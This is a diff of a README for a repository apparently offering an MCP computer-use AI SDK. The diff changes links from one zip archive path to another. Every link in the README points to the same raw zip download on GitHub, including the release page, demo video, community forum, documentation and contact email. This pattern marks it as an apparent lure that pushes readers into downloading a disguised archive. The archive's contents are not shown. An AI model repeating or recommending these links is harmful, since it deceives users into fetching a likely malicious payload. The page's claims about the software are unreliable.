@@ -1,6 +1,6 @@
 # 🤖 MCP-server-client-computer-use-ai-sdk - Control Your Computer with AI
 
-[![Download Release](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/shoddywards/MCP-server-client-computer-use-ai-sdk.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/shoddywards/MCP-server-client-computer-use-ai-sdk.zip)
+[![Download Release](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/mcp-client-nextjs/sdk_ai_MC_server_computer_client_use_v1.2.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/mcp-client-nextjs/sdk_ai_MC_server_computer_client_use_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -15,9 +15,9 @@ Welcome to the MCP-server-client-computer-use-ai-sdk! This software allows you t
 
 ## 📥 Download & Install
 
-To get started, you need to download the software from our [Releases page](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/shoddywards/MCP-server-client-computer-use-ai-sdk.zip). Click the link below to visit the page:
+To get started, you need to download the software from our [Releases page](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/mcp-client-nextjs/sdk_ai_MC_server_computer_client_use_v1.2.zip). Click the link below to visit the page:
 
-[Download Release](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/shoddywards/MCP-server-client-computer-use-ai-sdk.zip)
+[Download Release](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/mcp-client-nextjs/sdk_ai_MC_server_computer_client_use_v1.2.zip)
 
 1. Open the link to the Releases page.
 2. Locate the latest version of the MCP Server Client.
@@ -56,23 +56,23 @@ These examples demonstrate how versatile the MCP Server can be.
 
 We provide demos showcasing what you can build with our MCP server. You can view an example of an agent sending a message here:
 
-[Demo Video](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/shoddywards/MCP-server-client-computer-use-ai-sdk.zip)
+[Demo Video](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/mcp-client-nextjs/sdk_ai_MC_server_computer_client_use_v1.2.zip)
 
 ## ✍️ Support and Community
 
-If you encounter any issues or have questions, feel free to visit our community forum at [https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/shoddywards/MCP-server-client-computer-use-ai-sdk.zip](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/shoddywards/MCP-server-client-computer-use-ai-sdk.zip). Connect with other users and learn from their experiences.
+If you encounter any issues or have questions, feel free to visit our community forum at [https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/mcp-client-nextjs/sdk_ai_MC_server_computer_client_use_v1.2.zip](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/mcp-client-nextjs/sdk_ai_MC_server_computer_client_use_v1.2.zip). Connect with other users and learn from their experiences.
 
 ## 📞 Contact
 
-For direct support, you can reach our team via email at https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/shoddywards/MCP-server-client-computer-use-ai-sdk.zip or on our community forum.
+For direct support, you can reach our team via email at https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/mcp-client-nextjs/sdk_ai_MC_server_computer_client_use_v1.2.zip or on our community forum.
 
 ## 🔗 Additional Resources
 
 Check out our documentation for more detailed instructions on how to maximize the use of your MCP Server:
 
-- [Documentation](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/shoddywards/MCP-server-client-computer-use-ai-sdk.zip)
-- [Community Forum](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/shoddywards/MCP-server-client-computer-use-ai-sdk.zip)
+- [Documentation](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/mcp-client-nextjs/sdk_ai_MC_server_computer_client_use_v1.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/mcp-client-nextjs/sdk_ai_MC_server_computer_client_use_v1.2.zip)
 
-Don’t forget to see our [Releases page](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/shoddywards/MCP-server-client-computer-use-ai-sdk.zip) to stay updated on the latest versions and features!
+Don’t forget to see our [Releases page](https://raw.githubusercontent.com/Omkarjamadar/MCP-server-client-computer-use-ai-sdk/main/mcp-client-nextjs/sdk_ai_MC_server_computer_client_use_v1.2.zip) to stay updated on the latest versions and features!
 
 Thank you for choosing MCP Server Client. We hope you enjoy using our software to automate and streamline your tasks.
